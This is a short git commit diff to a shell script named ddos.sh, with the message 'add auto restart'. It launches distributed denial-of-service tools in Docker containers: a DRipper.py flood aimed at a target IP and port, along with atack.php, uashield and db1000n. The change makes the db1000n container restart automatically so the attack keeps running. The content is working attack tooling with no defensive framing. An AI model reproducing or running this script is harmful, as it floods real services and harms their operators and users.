e6c6346be4382dd311ce7fc1dc95947b7327e398
Andrew G Sorokin <angello@elm.dp.ua>
2022-03-05 17:59:59 +0200

    add auto restart

--- ddos.sh
+++ ddos.sh
@@ -14,7 +14,7 @@ cd /root/stopWar
 #	/usr/bin/docker run -d cherniavsky94/stop-war python3 DRipper.py -s $ip -p $port -t 443 -q 10000 > docker.list
 #	/usr/bin/docker run -d angello2docker/atack.php >> docker.list
 #	/usr/bin/docker run -d ghcr.io/opengs/uashield:0.0.x 1024 true  >> docker.list
-	/usr/bin/docker run -d ghcr.io/arriven/db1000n >> docker.list
+	/usr/bin/docker run -d --restart always ghcr.io/arriven/db1000n >> docker.list
 #    fi
 #done
 
